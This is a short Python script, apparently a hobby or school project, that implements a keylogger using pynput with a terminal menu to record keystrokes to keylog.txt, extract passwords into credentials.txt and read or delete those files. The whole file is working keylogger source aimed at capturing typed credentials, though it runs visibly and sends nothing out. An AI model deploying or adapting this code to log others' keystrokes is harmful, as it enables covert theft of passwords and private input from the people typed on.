#!/bin/python3.10

from pynput.keyboard import Listener
from os import system, remove
import sys
from ft_validateNumber import validateNumber
from ft_readFile import *
from ft_saveInFile import saveInFile
from ft_detectEIPassword import detectEIPassword
from ft_deleteFile import deleteFile


'''
 Function that shows a menu on the screen to the user
 To store the password in the credentials.txt file, press CTRL+ESC
'''

def menu():

    system("clear")
    print("+============= MENU =============+")
    print("|1. recordKey (CTRL+ESC to back) |")
    print("|2. readLogs                     |")
    print("|3. readCredentials              |")
    print("|4. delete credentials.txt       |")
    print("|5. delete keylog.txt            |")
    print("|6. Exit                         |")
    print("+================================+")

    option = validateNumber()
    if (option > 0 and option < 7):
        if option == 1:
            with Listener(on_press=recordKey) as listener:
                listener.join()
        elif option == 2:
            readLogs()
        elif option == 3:
            readCredentials()
        elif option == 4:
            deleteFile('credentials.txt')
        elif option == 5:
            deleteFile('keylog.txt')
        elif option == 6:
            print("Exit. Thanks for use this program")
            exit()
    else:
        print("\nError, enter a number between 1 - 4\n")


'''
Function to capture keyboard events
'''

def recordKey(key):
    key=str(key)
    printDataConsole(key)
    if key == 'Key.esc':
        detectEIPassword()
        sys.stdout.flush()
        return False
    saveInFile(key)


'''
Function to display the text on the screen
'''

def printDataConsole(key):
    key = str(key)
    print("Captured Key: " +key)


'''
Principal function
'''

if __name__=='__main__':
    menu()
